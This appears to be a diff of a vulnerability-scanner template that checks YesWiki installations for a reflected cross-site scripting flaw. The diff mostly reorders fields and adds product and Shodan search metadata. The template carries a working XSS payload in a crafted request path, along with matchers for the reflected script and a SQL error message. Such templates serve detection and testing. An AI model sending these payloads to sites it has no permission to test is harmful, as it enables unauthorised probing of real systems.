@@ -1,5 +1,4 @@
 id: yeswiki-xss
-
 info:
   name: YesWiki <2022-07-07 - Cross-Site Scripting
   author: arafatansari
@@ -14,31 +13,28 @@ info:
     cwe-id: CWE-79
     cpe: cpe:2.3:a:yeswiki:yeswiki:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: yeswiki
+    shodan-query: http.html:"yeswiki"
     vendor: yeswiki
-  tags: yeswiki,huntr,xss,vuln
-
+    verified: true
+  tags: huntr,vuln,xss,yeswiki
 http:
-  - method: GET
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - <script>alert(document.domain)</script>
+          - 'Query failed:'
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "<script>alert(document.domain)</script>"
-          - "Query failed:"
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
-      - type: status
-        status:
-          - 200
-
